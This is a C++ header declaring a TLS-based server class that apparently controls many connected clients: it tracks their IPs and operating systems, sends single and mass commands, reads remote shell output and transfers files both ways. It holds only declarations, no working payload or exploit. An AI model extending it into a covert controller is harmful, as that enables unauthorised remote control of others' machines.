#ifndef __SERVER
#define __SERVER
#include "headers.hpp"
struct Client_Struct{
	SSL *sslSocket;
	int iID;
	int sckClient;
	std::string strIP;
	std::string strOS;
	bool isFlag;
	bool isConnected;
};

struct bio_addrinfo_st {
    int bai_family;
    int bai_socktype;
    int bai_protocol;
    size_t bai_addrlen;
    struct sockaddr *bai_addr;
    struct bio_addrinfo_st *bai_next;
};

union bio_addr_st {
    struct sockaddr sa;
    struct sockaddr_in s_in;

};

class Server{
	private:
		std::mutex mtxMutex;
		SSL_CTX *sslCTX = nullptr;
		BIO *bioServer = nullptr;
		SOCKET sckSocket = INVALID_SOCKET;
	public:		
		struct Client_Struct *Clients[Max_Clients];
		int iClientsOnline = 0;
		u_int uiLocalPort = DefaultPort;
		bool isReceiveThread = false;
		bool isCmdThread = false;
		bool isReadingShell = false;
		Server() : uiLocalPort(DefaultPort) {}
		Server(u_int uiPortNumber) : uiLocalPort(uiPortNumber) {}
		~Server(){
			if(sslCTX){
				SSL_CTX_free(sslCTX);
				sslCTX = nullptr;
			}
			if(bioServer){
				BIO_free_all(bioServer);
				bioServer = nullptr;
			}
			if(sckSocket != INVALID_SOCKET){
				BIO_closesocket(sckSocket);
				sckSocket = INVALID_SOCKET;
			}
		}
		bool Listen();
		int WaitConnection(char*&);
		void thStartHandler();
		void mtxLock();
		void mtxUnlock();
		void ParseClientCommand(const std::string, int);
		void ParseMassiveCommand(const std::string);
		void ParseBasicInfo(char*&, int);
		void PrintClientList();
		void NullClients();
		void FreeClient(int);
		void FreeAllClients();
		bool DownloadFile(const std::string, int);
		bool SendFile(const std::string, const std::string, int, char);
		void threadListener();
		void threadMasterCMD();
		void threadClientPing();
		void threadRemoteCmdOutput(int);
		
		void Help(const std::string, int);
	};

#endif
